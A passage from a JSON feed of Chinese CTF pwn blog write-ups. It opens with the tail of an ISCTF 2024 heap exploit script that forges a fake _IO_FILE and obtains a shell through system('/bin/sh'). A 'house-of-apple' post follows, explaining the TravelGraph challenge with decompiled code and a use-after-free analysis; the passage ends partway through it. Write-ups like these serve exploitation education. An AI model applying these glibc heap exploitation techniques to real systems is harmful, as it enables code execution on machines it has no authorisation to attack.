0xb0\nlg('libcbase')\nlibc.address = libcbase\npad = b'a'*        0x10\nedit(2,len(pad),pad)\nshow(2)\nru(pad)\nheapbase = u64(rc(6).ljust(8,b'\\x00')) - 0x270\nlg('heapbase')\ntarget_addr = libc.symbols['_IO_list_all']\nsys_addr = libc.symbols['system']\nbinsh = next(libc.search(b'/bin/sh'))\n_lock = libcbase + 0x3ec708\nfake_IO_FILE = libcbase\n_IO_wfile_jumps = libcbase + 0x3e7d60\nfake_wfile = heapbase + 0x0228a0 + 0x100\nlg('fake_wfile')\n# pause()\n# ogg = [0x4f2be,0x4f2c5,0x4f322,0x10a38c]\n \nfake_file = flat(&#123;\n    0:&#123;\n        0:0x320,\n        0x68:next(libc.search(b'/bin/sh')),\n        0xa0:fake_wfile,\n        0xa8:libc.symbols['system'],\n        0xd8:_IO_wfile_jumps\n    &#125;,\n    0x100:&#123;\n        0x18:0,\n        0x30:0,\n        0x70:0,\n        0x88:0,\n        0x130:fake_wfile + 0x200\n    &#125;,\n    0x300:&#123;\n        0x68:libc.address + 0x520C7\n    &#125;\n&#125;)\nadd(0x980)\npl = b'a'*0x980 + p64(0) + p64(0x761)\nedit(3,len(pl),pl)\nadd(0x1000)\npl = b'a'*0x980 + p64(0) + p64(0x971)\nedit(3,len(pl),pl)\npl = b'a'*0x400+p64(0)+p64(0x961)+p64(libcbase+0x3ec1e0)+p64(target_addr-0x10)+p64(heapbase+0x680)+p64(target_addr-0x20)\nedit(2, len(pl), pl)\n\nadd(0xa00)\n\nedit(3, 0x2000, b'b'*0x980 + fake_file)\npause()\n\nsla('Enter \\n',str(0))\nit()\n</code></pre>\n<p><img data-src=\"/img/ISCTF-2024/20.png\" alt=\"img\"></p>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/08/30/house-of-apple/",
            "url": "https://yhuanhuan01.github.io/2024/08/30/house-of-apple/",
            "title": "house-of-apple",
            "date_published": "2024-08-30T07:50:08.000Z",
            "content_html": "<h1 id=\"house-of-apple\"><a class=\"markdownIt-Anchor\" href=\"#house-of-apple\">#</a> house-of-apple</h1>\n<blockquote>\n<p>前言:</p>\n<p>正好打 24 年羊城杯做了看了一道 house-of-apple 的题目，拿来水水 blog。</p>\n</blockquote>\n<p>漏洞成因</p>\n<blockquote>\n<p>堆溢出写，uaf</p>\n</blockquote>\n<p>适用范围</p>\n<blockquote>\n<ul>\n<li><code>2.23</code> —— 至今</li>\n<li>程序从  <code>main</code>  函数返回或能调用  <code>exit</code>  函数</li>\n<li>能泄露出  <code>heap</code>  地址和  <code>libc</code>  地址</li>\n<li>能使用一次  <code>largebin attack</code> （一次即可）</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>接下来直接去将这道题的做题手法</p>\n</blockquote>\n<h3 id=\"travelgraph\"><a class=\"markdownIt-Anchor\" href=\"#travelgraph\">#</a> TravelGraph</h3>\n<blockquote>\n<p>利用手法</p>\n</blockquote>\n<ul>\n<li>通过构造合理堆块，free 后残留指针泄露 libc 和 heap</li>\n<li>利用堆风水，构造 <code>1</code>  次 <code>largebin attack</code> ，替换 <code>_IO_list_all</code>  为堆地址</li>\n<li>利用 <code>house of apple</code> ，修改掉 <code>pointer_guard</code>  的值</li>\n<li>利用 <code>house of emma</code>  并结合几个 <code>gadgets</code>  控制 <code>rsp</code></li>\n<li>用 <code>rop</code>  链输出 <code>flag</code></li>\n</ul>\n<p><img data-src=\"/img/house-of-apple/image-20240830110226247.png\" alt=\"image-20240830110226247\"></p>\n<blockquote>\n<p>可见符号表并没有去掉</p>\n</blockquote>\n<p><img data-src=\"/img/house-of-apple/image-20240830110405090.png\" alt=\"image-20240830110405090\"></p>\n<blockquote>\n<p>保护也是理所当然的全开了</p>\n</blockquote>\n<p>接下来分析函数</p>\n<p><code>get_city_name</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__int64 <span class=\"token function\">get_city_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-24h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> s2<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-20h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+28h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Please input the city name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">read_str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>__int64<span class=\"token punctuation\">)</span>s2<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">></span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>cities<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> s2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>add</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-28h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-24h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  _DWORD <span class=\"token operator\">*</span>v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-20h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">char</span> s2<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1Eh] [rbp-12h] BYREF</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+28h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"What kind of transportation do you want? car/train/plane?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">read_str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>__int64<span class=\"token punctuation\">)</span>s2<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"car\"</span><span class=\"token punctuation\">,</span> s2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    v1 <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"train\"</span><span class=\"token punctuation\">,</span> s2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    v1 <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"plane\"</span><span class=\"token punctuation\">,</span> s2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    v1 <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">80</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  v3<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"From where?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  <span class=\"token operator\">*</span>v3 <span class=\"token operator\">=</span> <span class=\"token function\">get_city_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"To where?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  v3<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_city_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"How far?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  v3<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">read_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v3<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">1000</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v3<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"That's too far!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Note:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> v3 <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">79</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  <span class=\"token keyword\">return</span> v5 <span class=\"token operator\">-</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里通过出行方式去设置 malloc 的 size 大小，输入距离不能超过 1000，同样是通过 size 大小读入数据，无堆溢出。</p>\n<p><code>delete</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  __int64 v0<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-Ch]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> city_name<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"From where?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  city_name <span class=\"token operator\">=</span> <span class=\"token function\">get_city_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"To where?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>v0<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_city_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  v4 <span class=\"token operator\">=</span> v0<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">!=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    v0 <span class=\"token operator\">=</span> routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v0 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> city_name <span class=\"token operator\">==</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> v4 <span class=\"token operator\">==</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4LL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>v0<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> v4 <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span>_DWORD<span class=\"token punctuation\">)</span>v0<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>v0<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> city_name <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span>_DWORD<span class=\"token punctuation\">)</span>v0<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4LL</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>v0<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Successfully delete!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token keyword\">return</span> v0<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>存在 uaf 漏洞</p>\n<p><code>show</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  __int64 v0<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-Ch]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> city_name<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"From where?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  city_name <span class=\"token operator\">=</span> <span class=\"token function\">get_city_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"To where?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>v0<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_city_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  v4 <span class=\"token operator\">=</span> v0<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">!=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    v0 <span class=\"token operator\">=</span> routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v0 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> city_name <span class=\"token operator\">==</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> v4 <span class=\"token operator\">==</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4LL</span><span class=\"token 